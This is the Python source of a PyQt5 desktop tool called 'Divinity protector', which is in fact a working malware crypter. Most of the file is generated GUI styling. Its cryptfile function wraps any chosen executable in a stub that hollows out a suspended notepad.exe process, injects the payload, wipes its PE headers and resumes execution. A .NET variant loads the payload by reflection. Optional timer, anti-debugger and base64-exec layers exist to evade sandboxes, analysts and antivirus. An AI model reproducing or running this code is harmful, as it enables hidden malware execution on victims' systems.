# -*- coding: utf-8 -*-
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtCore import Qt, QPoint
import base64, random, string
from itertools import cycle
from cryptography.fernet import Fernet
import definitions
from ctypes import *
from ctypes.wintypes import LPVOID
import os, ctypes, sys, platform
import clr
from System.Reflection import Assembly
import nuitka

class Ui_Dialog(object):
    def setupUi(self, Dialog):
        Dialog.setObjectName("Dialog")
        Dialog.resize(187, 199)
        Dialog.setFixedSize(187, 199)
        palette = QtGui.QPalette()
        brush = QtGui.QBrush(QtGui.QColor(0, 0, 0))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.WindowText, brush)
        brush = QtGui.QBrush(QtGui.QColor(38, 38, 38))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Button, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Midlight, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Dark, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Mid, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 0, 0))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Text, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 0, 0))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.ButtonText, brush)
        brush = QtGui.QBrush(QtGui.QColor(38, 38, 38))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Base, brush)
        brush = QtGui.QBrush(QtGui.QColor(38, 38, 38))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Window, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Shadow, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.AlternateBase, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.NoRole, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 0, 0))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.WindowText, brush)
        brush = QtGui.QBrush(QtGui.QColor(38, 38, 38))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Button, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Midlight, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Dark, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Mid, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 0, 0))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Text, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 0, 0))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.ButtonText, brush)
        brush = QtGui.QBrush(QtGui.QColor(38, 38, 38))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Base, brush)
        brush = QtGui.QBrush(QtGui.QColor(38, 38, 38))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Window, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Shadow, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.AlternateBase, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.NoRole, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.WindowText, brush)
        brush = QtGui.QBrush(QtGui.QColor(38, 38, 38))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Button, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Midlight, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Dark, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Mid, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Text, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.ButtonText, brush)
        brush = QtGui.QBrush(QtGui.QColor(38, 38, 38))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Base, brush)
        brush = QtGui.QBrush(QtGui.QColor(38, 38, 38))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Window, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Shadow, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.AlternateBase, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.NoRole, brush)
        Dialog.setPalette(palette)
        font = QtGui.QFont()
        font.setFamily("Rockwell")
        font.setPointSize(10)
        Dialog.setFont(font)
        Dialog.setCursor(QtGui.QCursor(QtCore.Qt.WhatsThisCursor))
        Dialog.setAutoFillBackground(False)
        Dialog.setStyleSheet("background-color: rgb(38, 38, 38)")
        self.pushButton = QtWidgets.QPushButton(Dialog)
        self.pushButton.setGeometry(QtCore.QRect(40, 140, 93, 28))
        palette = QtGui.QPalette()
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.WindowText, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Button, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Base, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Window, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.WindowText, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Button, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Base, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Window, brush)
        brush = QtGui.QBrush(QtGui.QColor(120, 120, 120))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.WindowText, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Button, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Base, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 127))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Window, brush)
        self.pushButton.setPalette(palette)
        self.pushButton.setAutoFillBackground(False)
        self.pushButton.setStyleSheet("background-color: rgb(0, 255, 127)")
        self.pushButton.setObjectName("pushButton")
        self.pushButton_2 = QtWidgets.QPushButton(Dialog)
        self.pushButton_2.setGeometry(QtCore.QRect(80, 20, 93, 21))
        self.pushButton_2.setStyleSheet("background-color: rgb(0, 255, 127)")
        self.pushButton_2.setObjectName("pushButton_2")
        self.label = QtWidgets.QLabel(Dialog)
        self.label.setGeometry(QtCore.QRect(10, 22, 55, 16))
        self.label.setStyleSheet("color: rgb(0, 255, 127)")
        self.label.setObjectName("label")
        self.label_2 = QtWidgets.QLabel(Dialog)
        self.label_2.setGeometry(QtCore.QRect(49, 118, 175, 16))
        self.label_2.setStyleSheet("color: rgb(0, 255, 127)")
        self.label_2.setObjectName("label_2")
        self.checkBox_net = QtWidgets.QCheckBox(Dialog)
        #self.checkBox_net.setGeometry(QtCore.QRect(47, 118, 81, 20))
        self.checkBox_net.setStyleSheet("color: rgb(0, 255, 127);\n"
"background-color: rgb(85, 85, 127)")
        self.checkBox_net.setObjectName("checkBox_net")
        self.checkBox = QtWidgets.QCheckBox(Dialog)
        self.checkBox_net.setGeometry(QtCore.QRect(10, 60, 81, 20))
        self.checkBox.setStyleSheet("color: rgb(0, 255, 127);\n"
"background-color: rgb(85, 85, 127)")
        self.checkBox.hide() 
        self.checkBox.setObjectName("checkBox")
        self.checkBox_2 = QtWidgets.QCheckBox(Dialog)
        self.checkBox_2.setGeometry(QtCore.QRect(100, 60, 81, 20))
        self.checkBox_2.setStyleSheet("color: rgb(0, 255, 127);\n"
"background-color: rgb(85, 85, 127)")
        self.checkBox_2.setObjectName("checkBox_2")
        self.checkBox_3 = QtWidgets.QCheckBox(Dialog)
        self.checkBox_3.setGeometry(QtCore.QRect(10, 90, 81, 20))
        self.checkBox_3.setStyleSheet("color: rgb(0, 255, 127);\n"
"background-color: rgb(85, 85, 127)")
        self.checkBox_3.setObjectName("checkBox_3")
        self.checkBox_4 = QtWidgets.QCheckBox(Dialog)
        self.checkBox_4.setGeometry(QtCore.QRect(100, 90, 81, 20))
        self.checkBox_4.setStyleSheet("color: rgb(0, 255, 127);\n"
"background-color: rgb(85, 85, 127)")
        self.checkBox_4.setObjectName("checkBox_4")
        self.label.setWordWrap(True)
        
        self.pushButton_2.clicked.connect(self.onInputFileButtonClicked)
        self.pushButton.clicked.connect(self.onCryptButtonClicked)
        
        self.retranslateUi(Dialog)
        QtCore.QMetaObject.connectSlotsByName(Dialog)

    def retranslateUi(self, Dialog):
        _translate = QtCore.QCoreApplication.translate
        Dialog.setWindowTitle(_translate("Dialog", "Divinity protector"))
        self.pushButton.setText(_translate("Dialog", "Protect"))
        self.pushButton_2.setText(_translate("Dialog", "Browse"))
        self.label.setText(_translate("Dialog", "Open file"))
        self.label_2.setText(_translate("Dialog", "Ready to go!"))
        self.checkBox_net.setText(_translate("Dialog", "Is .NET"))
        #self.checkBox.setText(_translate("Dialog", "Encrypt"))
        self.checkBox_2.setText(_translate("Dialog", "Timer"))
        self.checkBox_3.setText(_translate("Dialog", "Obfuscate"))
        self.checkBox_4.setText(_translate("Dialog", "Antidebug"))

    #code above is from the pyqt5 designer
    filename = ""

    def cryptfile(self,filepath,timer,obfuscation,antivm,isnet):
            paynet = """
import clr, base64
from System.Reflection import Assembly
#imports
#timer
#antivm

PAYLOAD_DATA = ""

#decrypt

assembly = Assembly.Load(base64.b64decode(PAYLOAD_DATA))
instance = assembly.CreateInstance(assembly.EntryPoint.Name)
assembly.EntryPoint.Invoke(instance,None)
            """
            pay = """
from ctypes import *
from ctypes.wintypes import LPVOID
import base64, os, ctypes, sys, platform, pefile
from definitions import CONTEXT64, PROCESS_INFORMATION, STARTUPINFO, WOW64_CONTEXT
from definitions import CONTEXT_FULL, CREATE_SUSPENDED, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, WOW64_CONTEXT_FULL
#imports
#timer
#antivm
USING_64_BIT = platform.architecture()[0] == '64bit'
#injection into notepad
#system32 = os.path.join(os.environ['SystemRoot'], 'SysNative' if 
#platform.architecture()[0] == '32bit' else 'System32')

TARGET_EXE = "C:\\\\Windows\\\\System32\\\\notepad.exe"
PAYLOAD_DATA = ""

#decrypt

startup_info = STARTUPINFO()
startup_info.cb = sizeof(startup_info)
process_info = PROCESS_INFORMATION()

#kernel = CDLL("C:\\\\Windows\\\\System32\\\\user32.dll")
if windll.kernel32.CreateProcessA(
                None,
                create_string_buffer(bytes(TARGET_EXE, "ascii")),
                None,
                None,
                False,
                CREATE_SUSPENDED,
                None,
                None,
                byref(startup_info),
                byref(process_info),
) == 0:
    sys.exit(0)

pe_payload = pefile.PE(None,base64.b64decode(PAYLOAD_DATA))
payload_data = base64.b64decode(PAYLOAD_DATA)

context = CONTEXT64() if USING_64_BIT else WOW64_CONTEXT()
context.ContextFlags = CONTEXT_FULL if USING_64_BIT else WOW64_CONTEXT_FULL
if windll.kernel32.GetThreadContext(process_info.hThread, byref(context)) == 0:
    sys.exit(0)

target_image_base = LPVOID()
if windll.kernel32.ReadProcessMemory(
            process_info.hProcess,
            LPVOID((context.Rdx if USING_64_BIT else context.Ebx) + 2 * sizeof(c_size_t)),
            byref(target_image_base),
            sizeof(LPVOID),
            None
) == 0:
    sys.exit(0)

if target_image_base == pe_payload.OPTIONAL_HEADER.ImageBase:
    if windll.ntdll.NtUnmapViewOfSection(process_info.hProcess, target_image_base) == 0:
        sys.exit(0)


if USING_64_BIT:
        windll.kernel32.VirtualAllocEx.restype = LPVOID
allocated_address = windll.kernel32.VirtualAllocEx(
        process_info.hProcess,
        LPVOID(pe_payload.OPTIONAL_HEADER.ImageBase),
        pe_payload.OPTIONAL_HEADER.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
)
if allocated_address == 0:
    sys.exit(0)

if windll.kernel32.WriteProcessMemory(
                process_info.hProcess,
                LPVOID(allocated_address),
                payload_data,
                pe_payload.OPTIONAL_HEADER.SizeOfHeaders,
                None,
) == 0:
    sys.exit(0)

for section in pe_payload.sections:
        section_name = section.Name.decode("utf-8").strip("\\x00")
        if windll.kernel32.WriteProcessMemory(
                process_info.hProcess,
                LPVOID(allocated_address + section.VirtualAddress),
                payload_data[section.PointerToRawData:],
                section.SizeOfRawData,
                None,
        ) == 0:
            sys.exit(0)

if USING_64_BIT:
    context.Rcx = allocated_address + pe_payload.OPTIONAL_HEADER.AddressOfEntryPoint
else:
    context.Eax = allocated_address + pe_payload.OPTIONAL_HEADER.AddressOfEntryPoint

if windll.kernel32.WriteProcessMemory(
            process_info.hProcess,
            LPVOID((context.Rdx if USING_64_BIT else context.Ebx) + 2 * sizeof(c_size_t)),
            payload_data[pe_payload.OPTIONAL_HEADER.get_field_absolute_offset("ImageBase"):],
            sizeof(LPVOID),
            None,
) == 0:
    sys.exit(0)

#erease PE headers
try:
    if windll.kernel32.RtlZeroMemory(LPVOID(context.Rdx if USING_64_BIT else context.Ebx), pe_payload.OPTIONAL_HEADER.SizeOfHeaders) == 0:
        sys.exit(0)
except:
    pass

if windll.kernel32.SetThreadContext(process_info.hThread, byref(context)) == 0:
    sys.exit(0)

if windll.kernel32.ResumeThread(process_info.hThread) == 0:
    sys.exit(0)
            """
            with open(filepath, "rb") as exe:
                with open("generated.py", "w") as replacing:
                    if isnet:
                        pay = paynet.replace("assembly",''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(random.randint(20,40)))).replace("instance",''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(random.randint(20,40))))
                    final = pay.replace('PAYLOAD_DATA = ""', 'PAYLOAD_DATA = b"' + base64.b64encode(exe.read()).decode() + '"')
                    if timer:
                        final = final.replace("#imports","import time,random\n#imports").replace("#timer","one = time.time()\ntime.sleep(random.randint(1,9))\ntwo = time.time()\nif (two-one)<1:\n    sys.exit(0)")
                    if antivm:
                        final = final.replace("#imports","import os,sys\nfrom ctypes import windll\n#imports").replace("#antivm","present = False\nwindll.kernel32.CheckRemoteDebuggerPresent(os.getpid(),present)\nif windll.kernel32.IsDebuggerPresent() or present:\n    sys.exit(0)")
                    if obfuscation:
                        final = final.split("#imports")[0] + "exec(base64.b64decode('"+base64.b64encode(final.split("#imports")[1].encode()).decode()+"'))"

                    replacing.write(final)

            os.system("nuitka --follow-imports --onefile generated.py --windows-disable-console")
            os.remove("generated.py")

    def onInputFileButtonClicked(self):
        self.filename, filter = QtWidgets.QFileDialog.getOpenFileName(parent=self, caption='Open file', filter='Executable Files (*.*)')

        if self.filename != "":
            self.label.setText(self.filename.split("/")[len(self.filename.split("/"))-1])
            
    def onCryptButtonClicked(self):
        #self.label_2.setGeometry(QtCore.QRect(5, 118, 175, 16))
        self.label_2.setGeometry(QtCore.QRect(53, 118, 175, 16))
        self.label_2.setText("Processing!")
        self.cryptfile(self.filename,self.checkBox_2.isChecked(),self.checkBox_3.isChecked(),self.checkBox_4.isChecked(),self.checkBox_net.isChecked())
        self.label_2.setText("Generated!")
        self.label_2.setGeometry(QtCore.QRect(50, 118, 175, 16))

    def mousePressEvent(self, event):
        self.oldPos = event.globalPos()

    def mouseMoveEvent(self, event):
        delta = QPoint (event.globalPos() - self.oldPos)
        self.move(self.x() + delta.x(), self.y() + delta.y())
        self.oldPos = event.globalPos()